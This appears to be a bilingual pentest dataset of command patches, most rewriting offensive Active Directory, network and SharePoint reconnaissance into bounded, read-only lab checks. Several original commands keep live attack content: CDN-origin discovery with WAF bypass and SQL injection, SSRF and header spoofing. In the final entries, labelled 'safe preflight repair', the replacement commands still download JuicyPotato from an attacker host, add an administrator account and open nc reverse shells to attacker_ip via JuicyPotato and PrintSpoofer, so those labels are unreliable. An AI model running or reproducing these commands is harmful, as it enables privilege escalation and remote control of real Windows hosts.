title.zh: 确认工作站域上下文
title.en: Confirm the Workstation Domain Context

description.zh: 读取当前工作站的域、登录域和系统配置摘要，先确认命令运行在哪个授权域上下文。
description.en: Read the workstation domain, logon domain, and configuration summary to confirm the authorized domain context before further queries.

title.zh: 列出指定域的域控制器
title.en: List Domain Controllers for One Domain

description.zh: 仅查询占位符 {DOMAIN} 对应域的域控制器列表，并把结果与 DNS SRV 记录和资产清单交叉核对。
description.en: Query domain controllers only for {DOMAIN}, then compare the result with DNS SRV records and the authorized asset inventory.

title.zh: 读取域用户与当前组上下文
title.en: Read Domain Users and the Current Group Context

description.zh: 读取域用户名称清单并记录当前主体的组令牌，用于区分目录可见性和本机有效授权，不尝试任何认证。
description.en: Read the domain user-name list and current principal group token to distinguish directory visibility from effective local authorization without attempting authentication.

title.zh: 核对域管理员组成员
title.en: Review Domain Admins Membership

description.zh: 读取 Domain Admins 当前成员并与批准的高权限账号基线比较，不修改组成员关系。
description.en: Read current Domain Admins membership and compare it with the approved privileged-account baseline without changing group membership.

title.zh: 读取域信任摘要
title.en: Read the Domain Trust Summary

description.zh: 读取当前域可见的信任关系摘要，记录方向、类型和目标域，并以目录配置为最终依据。
description.en: Read the visible trust summary for the current domain, recording direction, type, and target domain while treating directory configuration as authoritative.

title.zh: 从本地模块读取域对象
title.en: Read the Domain Object from a Local Module

description.zh: 从已审查的本地 PowerView 文件导入模块并读取 {DOMAIN} 域对象，禁止通过网络下载并直接执行脚本。
description.en: Import a reviewed local PowerView file and read the {DOMAIN} domain object; do not download and execute scripts over the network.

title.zh: 读取域策略基线
title.en: Read the Domain Policy Baseline

description.zh: 使用已加载的 PowerView 模块读取指定域策略，重点核对口令、锁定和 Kerberos 配置，不做任何策略修改。
description.en: Use the loaded PowerView module to read password, lockout, and Kerberos policy for one domain without modifying policy.

title.zh: 读取域控制器对象
title.en: Read Domain Controller Objects

description.zh: 使用已加载的 PowerView 模块读取指定域的控制器对象，并与 nltest 和 DNS 结果交叉验证。
description.en: Use the loaded PowerView module to read domain-controller objects for one domain and cross-check them against nltest and DNS results.

patches.expectedCommand:
# DNS历史记录查询获取真实IP:
# 1. SecurityTrails(需要API Key):
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a"   -H "APIKEY: YOUR_KEY" | jq '.records[].values[].ip'

# 2. ViewDNS:
curl -s "https://viewdns.info/iphistory/?domain=target.com"

# 3. DNS DB在线查询:
# https://dnsdb.io/
# https://securitytrails.com/
# https://completedns.com/

# 4. Censys搜索:
curl -s "https://search.censys.io/api/v2/hosts/search?q=target.com"   -u "API_ID:API_SECRET"

# 5. 使用FOFA:
# domain="target.com" && type="A"

# 6. 多地Ping对比:
nslookup target.com 8.8.8.8
nslookup target.com 1.1.1.1
patches.command:
dig +short {DOMAIN} A
dig +short {DOMAIN} AAAA
dig +short {DOMAIN} CNAME

title.zh: 记录当前 DNS 基线
title.en: Record the Current DNS Baseline

description.zh: 读取授权域名当前的 A、AAAA 和 CNAME 记录，记录时间与解析器，用于和资产清单及 CDN 配置对照。
description.en: Read current A, AAAA, and CNAME records for the authorized domain, recording time and resolver for comparison with the asset inventory and CDN configuration.

patches.expectedCommand:
# 通过邮件头泄露真实IP:
# 1. 触发目标站点发送邮件(注册/找回密码/订阅):
curl -d "email=attacker@gmail.com" "http://target.com/forgot-password"
curl -d "email=attacker@gmail.com" "http://target.com/subscribe"

# 2. 查看收到邮件的原始头(Gmail: 显示原始邮件):
# 查找以下字段中的IP:
# Received: from mail.target.com (203.0.113.50)
# X-Originating-IP: [203.0.113.50]
# Return-Path: <noreply@target.com>

# 3. 使用swaks发送邮件触发:
swaks --to attacker@gmail.com --from test@target.com --server target.com

# 4. 分析邮件头:
# 最底部的Received字段通常包含源服务器真实IP

# 5. 如果目标有RSS订阅:
# 订阅后查看请求来源IP
curl "http://target.com/rss" -v

title.zh: 核对邮件与 TXT 记录
title.en: Review Mail and TXT Records

description.zh: 读取 MX 与 TXT 记录以识别公开邮件和策略端点，只记录公开 DNS 元数据，不触发邮件或业务流程。
description.en: Read MX and TXT records to identify public mail and policy endpoints while recording public DNS metadata only and without triggering mail or business workflows.

patches.expectedCommand:
# 1. DNS历史记录查询:
# SecurityTrails:
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a"   -H "APIKEY: YOUR_KEY" | python3 -m json.tool

# 在线查询:
# https://viewdns.info/iphistory/?domain=target.com
# https://completedns.com/dns-history/
# https://dnshistory.org/dns-records/target.com

# 2. 证书透明度日志(CT Log):
curl -s "https://crt.sh/?q=target.com&output=json" |   python3 -c "import json,sys; [print(x['common_name'],x['name_value']) for x in json.load(sys.stdin)]"

# 3. Censys搜索:
# https://search.censys.io/search?q=services.tls.certificates.leaf.names%3Atarget.com

# 4. FOFA/Shodan搜索:
# FOFA: cert="target.com"
# Shodan: ssl.cert.subject.cn:target.com

title.zh: 查询证书透明度名称
title.en: Query Certificate Transparency Names

description.zh: 从公开证书透明度数据提取与授权域名相关的名称候选，结果仍需通过 DNS 和资产所有权复核。
description.en: Extract names related to the authorized domain from public certificate-transparency data, then verify candidates through DNS and asset ownership.

patches.expectedCommand:
# 1. 子域名可能未经CDN:
for sub in mail ftp ssh vpn dev staging test api admin mx; do
  ip=$(dig +short ${sub}.target.com A 2>/dev/null | head -1)
  [ -n "$ip" ] && echo "${sub}.target.com → $ip"
done

# 2. MX记录(邮件服务器通常不走CDN):
dig +short target.com MX
dig +short $(dig +short target.com MX | awk '{print $2}') A

# 3. SPF记录中的IP:
dig +short target.com TXT | grep -i "spf"
# v=spf1 ip4:203.0.113.50 include:... → 203.0.113.50可能是真实IP

# 4. 触发目标服务器主动连接:
# 在目标网站留下一个URL(如头像、webhook)指向自己的服务器
# 查看连接IP(这是目标的出站IP，通常是真实IP):
# nc -lvp 8888

# 5. SSRF利用:
# 如果存在SSRF漏洞，让服务器连接外部获取IP
curl "http://target.com/api/fetch?url=http://your-server.com/log-ip"

title.zh: 生成被动子域候选
title.en: Generate Passive Subdomain Candidates

description.zh: 使用被动数据源生成授权域名的子域候选，只把可解析且属于资产清单的名称纳入后续检查。
description.en: Generate passive subdomain candidates for the authorized domain and retain only names that resolve and belong to the approved asset inventory.

patches.expectedCommand:
# 1. 验证候选IP是否是真实服务器:
REAL_IP="203.0.113.50"

# 直接IP访问(Host头指定域名):
curl -sI "http://${REAL_IP}/" -H "Host: target.com"

# HTTPS访问(忽略证书):
curl -sk "https://${REAL_IP}/" -H "Host: target.com"

# 2. 对比响应确认:
cdn_resp=$(curl -s "https://target.com/" | md5sum)
direct_resp=$(curl -sk "https://${REAL_IP}/" -H "Host: target.com" | md5sum)
echo "CDN: $cdn_resp"
echo "Direct: $direct_resp"
[ "$cdn_resp" = "$direct_resp" ] && echo "[+] CONFIRMED: Real IP!"

# 3. 修改hosts绕过CDN测试:
echo "${REAL_IP} target.com" | sudo tee -a /etc/hosts

# 4. 直接对真实IP进行渗透(绕过CDN的WAF):
nmap -sV -p 1-65535 ${REAL_IP}
# CDN的WAF通常只保护CDN入口，直接访问真实IP可绕过
patches.command:
curl -sS -D edge.headers -o edge.body "https://{DOMAIN}/healthz"
curl -sS -D origin.headers -o origin.body --resolve "{DOMAIN}:443:{ORIGIN_IP}" "https://{DOMAIN}/healthz"

title.zh: 对比边缘与登记源站健康响应
title.en: Compare Edge and Registered-Origin Health Responses

description.zh: 仅对自有登记源站的固定 healthz 路径比较边缘与直连响应，保存状态、证书和响应头，不扫描其他端口或路径。
description.en: Compare edge and direct responses only for a fixed health endpoint on a registered owned origin, preserving status, certificate, and headers without scanning other ports or paths.

patches.expectedCommand:
# 找到真实IP后，CDN的WAF就被完全绕过了
# 但如果目标自身也有WAF，还需要:

# 1. 使用真实IP直接访问(绕过CDN WAF):
curl -sk "https://REAL_IP/vulnerable?id=1' OR 1=1--" -H "Host: target.com"

# 2. 如果CDN仅对常见端口做WAF:
# 扫描非标端口的Web服务:
nmap -sV -p 8080,8443,8888,9090,3000,4443,8000 REAL_IP

# 3. IPv6绕过(CDN可能只保护IPv4):
dig +short target.com AAAA
curl -6 "http://[IPv6_ADDRESS]/" -H "Host: target.com"

# 4. 源站IP白名单探测:
# 某些源站配置了仅允许CDN IP访问
# 尝试伪造CDN的IP:
curl -H "CF-Connecting-IP: 1.2.3.4" "http://REAL_IP/" -H "Host: target.com"
curl -H "X-Forwarded-For: CDN_IP" "http://REAL_IP/" -H "Host: target.com"

title.zh: 复测源站访问控制
title.en: Retest Origin Access Control

description.zh: 修复后对同一健康检查分别访问 CDN 和登记源站，确认边缘可用且源站按预期拒绝未授权直连。
description.en: After remediation, request the same health endpoint through the CDN and the registered origin to confirm edge availability and expected rejection of unauthorized direct access.

title.zh: 查询单一 HTTP 服务 SPN
title.en: Query One HTTP Service SPN

description.zh: 仅查询授权服务主机对应的 HTTP SPN，并记录登记主体，不再使用 */* 枚举整个域。
description.en: Query the HTTP SPN for one authorized service host and record its registered principal instead of enumerating every SPN in the domain.

title.zh: 在 SearchBase 内读取 SPN 用户
title.en: Read SPN Users Within One SearchBase

description.zh: 把查询限制到批准的 SearchBase 和最多 100 个结果，只输出账号与 SPN 属性。
description.en: Limit the query to the approved SearchBase and at most 100 results, returning only account and SPN properties.

title.zh: 查看 Impacket SPN 查询参数
title.en: Inspect Impacket SPN Query Arguments

description.zh: 只查看已安装版本的参数，不在命令行嵌入域凭证或请求任何服务票据。
description.en: Inspect arguments for the installed version without embedding domain credentials or requesting service tickets.

title.zh: 在指定域核对 HTTP SPN
title.en: Review an HTTP SPN in One Domain

description.zh: 在单一授权域中核对一个 HTTP 服务主机，避免通配服务和全域结果集。
description.en: Review one HTTP service host in one authorized domain without wildcard services or domain-wide result sets.

title.zh: 核对单一 MSSQL 服务 SPN
title.en: Review One MSSQL Service SPN

description.zh: 查询一个已登记主机和端口的 MSSQLSvc SPN，并与服务账号清单核对。
description.en: Query the MSSQLSvc SPN for one registered host and port and compare it with the service-account inventory.

title.zh: 低速核对常见 TCP 端口
title.en: Review Common TCP Ports at a Low Rate

description.zh: 仅对单一实验主机检查常见 20 个 TCP 端口，并限制速率和重试次数。
description.en: Check the 20 most common TCP ports on one lab host with explicit rate and retry limits.

title.zh: 核对批准的 TCP 端口集合
title.en: Review an Approved TCP Port Set

description.zh: 使用显式五端口列表替代全端口扫描，目标固定为一个授权实验主机。
description.en: Replace the full-port scan with an explicit five-port list against one authorized lab host.

title.zh: 轻量识别三个服务端口
title.en: Lightly Identify Three Service Ports

description.zh: 只对三个批准端口执行轻量版本识别，不运行默认或漏洞 NSE 脚本。
description.en: Run light version detection on three approved ports without default or vulnerability NSE scripts.

title.zh: 确认单一实验主机可达性
title.en: Confirm Reachability of One Lab Host

description.zh: 只检查一个登记主机是否可达，不枚举整个网段。
description.en: Check reachability for one registered host without enumerating a network range.

title.zh: 以有界 Nmap 代替 Masscan
title.en: Replace Masscan with a Bounded Nmap Check

description.zh: 移除高速全端口 Masscan，仅对一个实验主机的两个 Web 端口执行低速检查。
description.en: Remove high-speed full-port Masscan and check only two web ports on one lab host at a low rate.

title.zh: 限制操作系统指纹尝试
title.en: Limit Operating-System Fingerprint Attempts

description.zh: 仅对有响应端口的单一实验主机执行一次受限 OS 指纹尝试。
description.en: Run one limited OS fingerprint attempt against a single lab host with responsive ports.

title.zh: 低速核对五个 UDP 端口
title.en: Review Five UDP Ports at a Low Rate

description.zh: 把 UDP 检查限定到一个实验主机、五个常见端口和一次重试。
description.en: Limit UDP review to one lab host, five common ports, and one retry.

title.zh: 运行非侵入 HTTP 元数据脚本
title.en: Run Non-Intrusive HTTP Metadata Scripts

description.zh: 使用 http-title 和 http-headers 替代 vuln 脚本，只收集两个 Web 端口的响应元数据。
description.en: Use http-title and http-headers instead of vulnerability scripts and collect response metadata from two web ports only.

title.zh: 读取有界 Windows 接口配置
title.en: Read a Bounded Windows Interface Configuration

description.zh: 使用 PowerShell 读取最多 50 条本机接口、地址、DNS 和网络配置摘要，不修改网络配置。
description.en: Use PowerShell to read at most 50 local interface, address, DNS, and network configuration summaries without modifying network configuration.

title.zh: 读取有界 Windows 路由表
title.en: Read a Bounded Windows Route Table

description.zh: 按路由度量读取最多 50 条 IPv4 路由与接口信息，和批准的分段基线比较。
description.en: Read at most 50 IPv4 routes and interface details ordered by metric, then compare them with the approved segmentation baseline.

title.zh: 读取有界本机邻居缓存
title.en: Read a Bounded Local Neighbor Cache

description.zh: 读取最多 100 条现有 IPv4 邻居缓存，不发送额外探测包。
description.en: Read at most 100 existing IPv4 neighbor-cache entries without sending additional probes.

title.zh: 读取有限 TCP 连接清单
title.en: Read a Limited TCP Connection List

description.zh: 读取最多 100 条监听或已建立连接，并关联本机进程。
description.en: Read at most 100 listening or established connections and correlate them with local processes.

title.zh: 读取有界 Windows DNS 缓存
title.en: Read a Bounded Windows DNS Cache

description.zh: 读取最多 100 条本机 DNS 缓存记录用于故障排查，不触发远程解析。
description.en: Read at most 100 local DNS cache records for troubleshooting without triggering remote resolution.

title.zh: 读取 Linux 接口摘要
title.en: Read the Linux Interface Summary

description.zh: 使用 iproute2 输出本机接口与地址摘要，不使用已弃用的 ifconfig。
description.en: Use iproute2 to show local interface and address summaries instead of deprecated ifconfig output.

patches.command: ip -4 route show table main | head -n 50

title.zh: 读取有界 Linux 路由表
title.en: Read a Bounded Linux Route Table

description.zh: 读取 Linux 主路由表最多 50 行并与实验拓扑核对，不修改路由。
description.en: Read at most 50 lines from the Linux main route table and compare them with the lab topology without changing routes.

title.zh: 限制到实验网关的路由跟踪
title.en: Trace a Route Only to the Lab Gateway

description.zh: 仅对登记实验网关执行最多五跳、每跳 500 毫秒的路由跟踪。
description.en: Trace only the registered lab gateway with at most five hops and a 500 millisecond timeout per hop.

title.zh: 读取有界本机共享清单
title.en: Read a Bounded Local Share List

description.zh: 使用 SMB 模块读取最多 50 个本机已发布共享及其路径，不创建、删除或修改共享。
description.en: Use the SMB module to read at most 50 local published shares and paths without creating, deleting, or modifying shares.

title.zh: 读取单一实验主机共享
title.en: Read Shares on One Lab Host

description.zh: 只查询一个授权实验主机公布的共享名称，不扩展到工作组或网段。
description.en: Query published share names on one authorized lab host without expanding to a workgroup or network range.

title.zh: 使用交互凭证列出共享
title.en: List Shares with Interactive Credentials

description.zh: 对单一实验主机使用专用测试账号并交互输入凭证，避免把密码写入命令。
description.en: Use a dedicated test identity against one lab host and enter credentials interactively instead of placing a password in the command.

title.zh: 使用 NetExec 核对共享权限
title.en: Review Share Permissions with NetExec

description.zh: 使用本地实验凭证文件对一个主机执行一次共享查询，并设置五秒超时。
description.en: Use a local lab credential file for one share query against one host with a five-second timeout.

title.zh: 以 SMB2 最低协议列出共享
title.en: List Shares with SMB2 as the Minimum Protocol

description.zh: 对一个实验主机列出共享并显式禁用 SMB1 协商，不读取文件内容。
description.en: List shares on one lab host while disabling SMB1 negotiation and without reading file content.

title.zh: 限制 PowerView 共享查询结果
title.en: Limit PowerView Share Query Results

description.zh: 只返回指定域最多 20 个当前身份可见的共享，不递归搜索共享文件。
description.en: Return at most 20 shares visible to the current identity in one domain without recursively searching files.

title.zh: 在 SearchBase 内读取用户摘要
title.en: Read User Summaries Within One SearchBase

description.zh: 限定批准的 SearchBase 和最多 100 个结果，只输出账号、启用状态和 DN。
description.en: Limit the query to the approved SearchBase and at most 100 results, returning account, enabled state, and distinguished name only.

title.zh: 读取单一实验用户属性
title.en: Read One Lab User Object

description.zh: 读取专用实验用户的有限属性，不遍历其他账号或认证数据。
description.en: Read a limited property set for one dedicated lab user without traversing other identities or authentication data.

title.zh: 使用 PowerView 读取实验用户
title.en: Read a Lab User with PowerView

description.zh: 使用已审查的本地 PowerView 模块读取一个实验用户对象。
description.en: Use a reviewed local PowerView module to read one lab user object.

title.zh: 限制高权限标记用户查询
title.en: Limit the Privileged-Flag User Query

description.zh: 最多返回 50 个 adminCount 标记对象，并以实际组成员和 ACL 复核，不把标记直接视为管理员权限。
description.en: Return at most 50 adminCount-marked objects and verify them against actual group membership and ACLs instead of treating the flag as administrative access.

title.zh: 读取有限活跃用户基线
title.en: Read a Limited Active-User Baseline

description.zh: 在批准 SearchBase 内最多读取 50 个启用账号及其登录时间，用于和账号生命周期基线比较。
description.en: Read at most 50 enabled identities and their logon dates within the approved SearchBase for comparison with the identity-lifecycle baseline.

title.zh: 查看 Impacket 用户查询参数
title.en: Inspect Impacket User Query Arguments

description.zh: 只查看已安装版本参数，不在命令行嵌入域密码或执行全域查询。
description.en: Inspect arguments for the installed version without embedding a domain password or running a domain-wide query.

title.zh: 在 SearchBase 内读取组摘要
title.en: Read Group Summaries Within One SearchBase

description.zh: 在批准 SearchBase 内最多读取 100 个组的名称、范围和类型。
description.en: Read names, scopes, and categories for at most 100 groups within the approved SearchBase.

title.zh: 读取单一实验组成员
title.en: Read Members of One Lab Group

description.zh: 读取一个实验组最多 100 个直接成员，不更改成员关系。
description.en: Read at most 100 direct members of one lab group without changing membership.

title.zh: 使用 PowerView 读取实验组
title.en: Read a Lab Group with PowerView

description.zh: 使用本地已审查模块读取一个实验组的有限属性。
description.en: Use a reviewed local module to read a limited property set for one lab group.

title.zh: 限制高权限标记组查询
title.en: Limit the Privileged-Flag Group Query

description.zh: 最多返回 50 个 adminCount 标记组，并用成员关系与 ACL 复核。
description.en: Return at most 50 adminCount-marked groups and verify them against membership and ACLs.

title.zh: 使用 PowerView 读取组成员
title.en: Read Group Members with PowerView

description.zh: 读取一个实验组最多 100 个成员，不递归扩展到其他组。
description.en: Read at most 100 members of one lab group without recursively expanding other groups.

title.zh: 限制递归成员结果
title.en: Limit Recursive Membership Results

description.zh: 只对一个实验组递归解析，并把输出限制为 100 个对象。
description.en: Recursively resolve one lab group only and limit output to 100 objects.

title.zh: 读取单一实验 GPO
title.en: Read One Lab GPO

description.zh: 读取一个指定实验 GPO 的状态与修改时间，不枚举或修改全部策略。
description.en: Read status and modification time for one named lab GPO without enumerating or changing every policy.

title.zh: 使用 PowerView 读取实验 GPO
title.en: Read a Lab GPO with PowerView

description.zh: 使用本地已审查 PowerView 模块读取一个 GPO 对象及其 SYSVOL 路径。
description.en: Use a reviewed local PowerView module to read one GPO object and its SYSVOL path.

title.zh: 读取实验 GPO 本地组映射
title.en: Read Local-Group Mappings for One Lab GPO

description.zh: 只读取一个实验 GPO 定义的本地组映射，并与批准基线比较。
description.en: Read local-group mappings for one lab GPO and compare them with the approved baseline.

title.zh: 离线检查 GPP fixture
title.en: Inspect an Offline GPP Fixture

description.zh: 只在本地合成 Groups.xml fixture 中检查 cpassword 标记，不读取 SYSVOL 凭证文件。
description.en: Check for the cpassword marker only in a local synthetic Groups.xml fixture without reading credential files from SYSVOL.

title.zh: 生成实验主体 RSOP 报告
title.en: Generate an RSOP Report for Lab Principals

description.zh: 为一个实验用户和计算机生成本地 XML 报告，用于核对 GPO 作用域，不修改策略。
description.en: Generate a local XML report for one lab user and computer to review GPO scope without changing policy.

title.zh: 读取当前域信任摘要
title.en: Read the Current Domain Trust Summary

description.zh: 读取当前域可见的信任方向和类型，不尝试跨域认证。
description.en: Read visible trust directions and types for the current domain without attempting cross-domain authentication.

title.zh: 使用 PowerView 读取域信任
title.en: Read Domain Trusts with PowerView

description.zh: 使用本地已审查模块读取一个指定域的信任对象和方向。
description.en: Use a reviewed local module to read trust objects and directions for one specified domain.

title.zh: 限制 ADTrust 查询结果
title.en: Limit ADTrust Query Results

description.zh: 从一个登记域控制器读取最多 50 条信任记录，并与目录配置核对。
description.en: Read at most 50 trust records from one registered domain controller and compare them with directory configuration.

title.zh: 使用 PowerView 读取森林信任
title.en: Read Forest Trusts with PowerView

description.zh: 读取一个指定实验森林的信任摘要，不遍历外部森林资源。
description.en: Read the trust summary for one specified lab forest without traversing external forest resources.

patches.expectedCommand:
curl -k https://exchange.com/owa/auth/logon.aspx
检查页面源码获取版本信息

title.zh: 保存 OWA 基线响应
title.en: Preserve an OWA Baseline Response

description.zh: 对一个登记 Exchange 主机的 OWA 根路径执行一次证书校验请求，并把头与正文写入本地 artifacts。
description.en: Make one certificate-validated request to the OWA root on a registered Exchange host and preserve headers and body in local artifacts.

patches.expectedCommand:
curl -k -u user:pass https://exchange.com/autodiscover/autodiscover.xml
获取Exchange配置信息

title.zh: 读取 Autodiscover 响应头
title.en: Read Autodiscover Response Headers

description.zh: 只读取一个登记主机的 Autodiscover 响应头，不发送用户名、密码或邮箱地址。
description.en: Read response headers from Autodiscover on one registered host without sending a username, password, or mailbox address.

patches.expectedCommand:
python oab.py https://exchange.com
下载离线通讯录枚举用户

title.zh: 读取 OAB 配置摘要
title.en: Read the OAB Configuration Summary

description.zh: 通过已授权 Exchange 管理会话读取最多 20 个 OAB 配置对象，不下载通讯录内容。
description.en: Read at most 20 OAB configuration objects through an authorized Exchange management session without downloading address-book content.

title.zh: 读取单一 Exchange 服务器元数据
title.en: Read Metadata for One Exchange Server

description.zh: 读取一个登记 Exchange 服务器的版本、版本类型和角色，用于补丁基线核对。
description.en: Read version, edition, and roles for one registered Exchange server for comparison with the patch baseline.

patches.expectedCommand:
curl -k https://sharepoint.com/_api/web/webs
获取所有子站点

title.zh: 读取有限子站点元数据
title.en: Read Limited Subsite Metadata

description.zh: 使用专用实验 Token 读取最多 20 个子站点的 ID、标题和 URL，不读取站点内容。
description.en: Use a dedicated lab token to read IDs, titles, and URLs for at most 20 subsites without reading site content.

patches.expectedCommand:
curl -k https://sharepoint.com/_api/web/siteusers
获取站点用户列表

title.zh: 读取有限站点用户元数据
title.en: Read Limited Site-User Metadata

description.zh: 读取当前实验站点最多 20 个用户的有限标识字段，并与站点权限基线核对。
description.en: Read limited identity fields for at most 20 users in the lab site and compare them with the site-permission baseline.

patches.expectedCommand:
curl -k https://sharepoint.com/_api/web/lists
获取文档库列表

title.zh: 读取有限文档库元数据
title.en: Read Limited Document-Library Metadata

description.zh: 读取最多 20 个文档库的 ID、标题与项目数，不列出或下载文件。
description.en: Read IDs, titles, and item counts for at most 20 document libraries without listing or downloading files.

title.zh: 搜索固定实验 marker
title.en: Search for a Fixed Lab Marker

description.zh: 只搜索预先创建的 PAYLOADER_MARKER 并限制为 10 条结果，不使用 password 等敏感关键词。
description.en: Search only for the pre-created PAYLOADER_MARKER with a 10-result limit instead of using sensitive keywords such as password.

patches.expectedCommand:
https://sharepoint.com/sites/site_name/Shared Documents
通过浏览器访问文档库
下载敏感文件

title.zh: 读取实验文档库页面头
title.en: Read Headers for the Lab Library Page

description.zh: 只对实验站点文档库页面发送 HEAD 请求，记录授权和缓存头，不下载文档。
description.en: Send a HEAD request only to the lab site document-library page and record authorization and cache headers without downloading documents.

patches.expectedCommand:
curl -k -u user:password "https://sharepoint.com/_api/web/lists/getbytitle('Documents')/items"
获取文档列表
下载文件内容

title.zh: 读取有限文档项目元数据
title.en: Read Limited Document Item Metadata

description.zh: 读取实验文档库最多 20 个项目的 ID 与路径元数据，不请求文件正文。
description.en: Read ID and path metadata for at most 20 items in the lab library without requesting file content.

title.zh: 读取 PnP 文档库摘要
title.en: Read a PnP Document-Library Summary

description.zh: 在预先建立的实验 PnP 会话中读取一个文档库的标题、项目数和根目录。
description.en: Read title, item count, and root folder for one document library through a pre-established lab PnP session.

patches.expectedCommand:
使用OneDrive客户端同步SharePoint文档库
本地访问所有文件
离线查看敏感数据

title.zh: 检查本地 SharePoint fixture
title.en: Inspect Local SharePoint Fixtures

description.zh: 只检查本地合成 fixture 两层目录内最多 20 个文件的路径与大小，不递归同步租户文档。
description.en: Inspect paths and sizes for at most 20 files within two fixture-directory levels without synchronizing tenant documents.

title.zh: 查看 dnscat2 服务端参数
title.en: Inspect dnscat2 Server Arguments

description.zh: 只查看本地受控副本的服务端参数，不绑定 53 端口或指定外部域名。
description.en: Inspect server arguments from a controlled local copy without binding port 53 or specifying an external domain.

title.zh: 查看 dnscat2 客户端参数
title.en: Inspect dnscat2 Client Arguments

description.zh: 只查看客户端 DNS、密钥和日志参数，不连接任何服务端。
description.en: Inspect client DNS, key, and logging arguments without connecting to a server.

title.zh: 离线查阅会话与监听文档
title.en: Review Session and Listener Documentation Offline

description.zh: 在本地项目文档中最多返回 20 个 session/listen 匹配，不启动会话或端口转发。
description.en: Return at most 20 session or listen matches from local project documentation without starting a session or port forward.

title.zh: 查看 icmptunnel 参数
title.en: Inspect icmptunnel Arguments

description.zh: 只查看本地二进制的服务端和客户端参数，不创建 TUN 设备或发送 ICMP 数据。
description.en: Inspect server and client arguments for the local binary without creating a TUN device or sending ICMP data.

title.zh: 检查文件能力与现有 TUN 接口
title.en: Inspect File Capabilities and Existing TUN Interfaces

description.zh: 只读取二进制文件能力与当前 TUN/TAP 接口，用于确认实验前提，不启动客户端。
description.en: Read binary capabilities and current TUN or TAP interfaces to confirm lab prerequisites without starting a client.

title.zh: 展开 SSH 动态代理配置
title.en: Expand SSH Dynamic-Proxy Configuration

description.zh: 只展开专用实验跳板机的 SSH 配置，核对最终主机、用户、端口和回环监听，不建立连接。
description.en: Expand SSH configuration for the dedicated lab jump host and review host, user, port, and loopback listener without opening a connection.

patches.expectedCommand:
编辑 /etc/proxychains.conf:
[ProxyList]
socks5 127.0.0.1 1080

使用:
proxychains nmap -sT target

title.zh: 使用一次性 ProxyChains 配置
title.en: Use a Disposable ProxyChains Configuration

description.zh: 在工作目录创建一次性配置并只请求回环 marker，不修改 /etc 配置或扫描网段。
description.en: Create a disposable configuration in the working directory and request one loopback marker without editing /etc configuration or scanning a network.

patches.expectedCommand:
beacon> socks 1080
在CS中启动SOCKS代理

title.zh: 查看 Cobalt Strike SOCKS 帮助
title.en: Inspect Cobalt Strike SOCKS Help

description.zh: 只在专用实验 Beacon 控制台查看 socks 参数，不启动监听器、路由或远程会话。
description.en: Read socks arguments in a dedicated lab Beacon console without starting a listener, route, or remote session.

patches.expectedCommand:
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run

title.zh: 查看 Metasploit SOCKS 模块信息
title.en: Inspect Metasploit SOCKS Module Information

description.zh: 只查看当前模块参数后退出，不运行模块或创建监听器。
description.en: Inspect current module arguments and exit without running the module or creating a listener.

patches.expectedCommand:
# 检查是否拥有Impersonate权限
whoami /priv

# 重点关注以下权限:
# SeImpersonatePrivilege - 模拟客户端令牌
# SeAssignPrimaryTokenPrivilege - 替换进程级令牌

# 确认当前用户身份
whoami /all
echo %USERNAME%

title.zh: Potato 工具能力安全预检命令校正 1
title.en: Safe Potato-Tool Capability Preflight Command Repair 1

description.zh: 仅移除纯叙述或修正实验占位符，保留 Potato 工具能力安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。
description.en: Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Potato-Tool Capability Preflight syntax; record authorization, rollback, and blue-team evidence during execution.

explanation.zh: 列出当前用户所有特权
允许模拟其他用户令牌的关键特权
explanation.en: Key privilege allowing impersonation of other user tokens

explanation.zh: 允许为新进程分配令牌
explanation.en: Allows assigning tokens to new processes

patches.expectedCommand:
# 下载JuicyPotato
certutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\temp\jp.exe

# 使用JuicyPotato提权执行命令
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\temp\proof.txt" -t *

# 使用特定CLSID (不同系统需要不同CLSID)
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# 反弹Shell
C:\temp\jp.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe attacker_ip 4444" -t *
patches.command:
certutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\temp\jp.exe
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\temp\proof.txt" -t *
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
C:\temp\jp.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe attacker_ip 4444" -t *

title.zh: Potato 工具能力安全预检命令校正 2
title.en: Safe Potato-Tool Capability Preflight Command Repair 2

description.zh: 仅移除纯叙述或修正实验占位符，保留 Potato 工具能力安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。
description.en: Remove narrative-only text or repair lab placeholders while preserving reproducible Safe Potato-Tool Capability Preflight syntax; record authorization, rollback, and blue-team evidence during execution.

explanation.en: Need with SYSTEM Permission Execute Program
Meanwhile Attempt Create Process With Token and Create Process As User

explanation.zh: 指定COM对象CLSID(需匹配目标系统版本)
explanation.en: Specify COM object CLSID (must match target system version)

patches.expectedCommand:
# PrintSpoofer - 利用打印服务命名管道
PrintSpoofer.exe -i -c cmd

# 直接执行命令
PrintSpoofer.exe -c "cmd /c whoami > C:\temp\proof.txt"

# 反弹Shell
PrintSpoofer.exe -c "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe"

# 以SYSTEM身份启动PowerShell
PrintSpoofer.exe -i -c powershell.exe
patches.command:
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "cmd /c whoami > C:\temp\proof.txt"
PrintSpoofer.exe -c "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe"
PrintSpoofer.exe -i -c powershell.exe

title.zh: Potato 工具能力安全预检命令校正 3
title.en: Safe Potato-Tool Capability Preflight Command Repair 3

description.zh: 仅移除纯叙述或修正实验占位符，保留 Potato 工具能力安全预检 的可复现技术语法；执行时记录授权、回滚和蓝队证据。
